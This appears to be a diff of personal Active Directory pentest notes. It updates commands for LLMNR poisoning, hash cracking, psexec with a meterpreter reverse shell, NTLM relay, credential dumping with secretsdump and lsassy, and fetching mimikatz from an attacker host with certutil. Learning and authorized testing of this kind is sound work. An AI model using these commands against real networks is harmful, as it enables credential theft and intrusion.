@@ -408,7 +408,7 @@ Simple shell to fully interactive shell
 
 ### Initial attack vectors
 
-Usually drop of a device to simulate breaking into the network of a client.
+Usually drop off a device to simulate breaking into the network of a client.
 
 #### LLMNR Poisoning
 
@@ -425,16 +425,16 @@ Steps:
 - An event occurs...
 - Get dem hashes
 - Crack dem hashes
-  - `hashcat -m [mode] hashes/hashes.txt rockyou.txt`
+  - `hashcat -m [mode] ~/hashes/hashes.txt usr/share/wordlists/rockyou.txt`
   - If hash already cracked:
-    - `hashcat -m [mode] hashes/hashes.txt rockyou.txt --show`
+    - `hashcat -m [mode] ~/hashes/hashes.txt usr/share/wordlists/rockyou.txt --show`
   - If doesn't work *(only if on VM)*:
-    - `hashcat -m [mode] hashes/hashes.txt rockyou.txt --force`
+    - `hashcat -m [mode] ~/hashes/hashes.txt usr/share/wordlists/rockyou.txt --force`
   - On metal, always run:
-    - `hashcat -m [mode] hashes/hashes.txt rockyou.txt -O`
+    - `hashcat -m [mode] ~/hashes/hashes.txt usr/share/wordlists/rockyou.txt -O`
 
 Mitigation:
-- Disable LLMNR & NBT-NS
+- Disable LLMNR & NBT-NS in group policy
 - If not possible:
   - Require Network Access Control
   - Require strong user passwords
@@ -473,10 +473,12 @@ Mitigation:
 
 Metasploit - with password
 - `use exploit/windows/smb/psexec`
+  - `set payload windows/x64/meterpreter/reverse_tcp`
   - `show targets` can be useful
 
 Metasploit - with hash
 - `use exploit/windows/smb/psexec`
+  - `set payload windows/x64/meterpreter/reverse_tcp`
   - `show targets` can be useful
 
 psexec.py - with password
@@ -501,7 +503,7 @@ This is called Man in the Middle 6 *(MitM6)*.
 
 Steps:
 - Setup `ntlmrelayx.py`
-  - `ntlmrelayx.py -6 -t ldaps://192.168.4.128 -wh fakewpad.marvel.local -l lootme`
+  - `ntlmrelayx.py -6 -t ldaps://[DC-ip] -wh fakewpad.marvel.local -l lootme`
 - Launch MitM6
   - `sudo mitm6 -d [domain]`
 - Now collect ye plunder in `lootme`
@@ -603,7 +605,7 @@ Use:
 - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -d [Domain] -p [password]`
 
 Get hashes:
-- Through metasploit hashdump
+- Through metasploit meterpreter hashdump
 - `secretsdump.py [Domain]/[user]:[password]@xxx.xxx.xxx.xxx`
 
 Use:
@@ -617,9 +619,9 @@ Use:
 - Dump lsass
   - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth -M lsassy` *(Can give hashes not in secretsdump)*
 
-Use `cmedb` do look at all crackmapexec uses and credentials.
+Use `cmedb` to look at all crackmapexec uses and credentials. 
 
-secretsdump is useful to dump all secrets on a device.
+secretsdump is useful to dump all secrets on a device. **Use this on every machine.** Then respray the network with new local accounts and continue this process.
 - Password
   - `secretsdump.py [Domain]/[user]:'[password]'@xxx.xxx.xxx.xxx`
 - Hash
@@ -708,7 +710,7 @@ Can also use `netexec` or `crackmapexec` to do this:
 The key to cPassword was accidentally released. Patched in MS14-025, but it doesn't prevent previous uses.
 
 Given a cPassword hash you can do the following
-- gpp-decrypt [hash]
+- `gpp-decrypt [hash]`
 
 Given credentials, use metasploit `search gpp` with valid domain credentials.
 
@@ -738,7 +740,7 @@ Steps
 - Host http server to download files to device
   - `python3 -m http.server 80` in mimikatz directory
   - Get a shell on device
-  - `certutil.exe -urlcache -f "http://192.168.4.8/mimikatz.exe" mimikatz.exe` in writeable folder
+  - `certutil.exe -urlcache -f "http://[attacker-url]/mimikatz.exe" mimikatz.exe` in writeable folder
 - Execute `mimikatz.exe`
 - `privilege::` -> `privilege::debug`
 - `sekurlsa::logonPasswords`
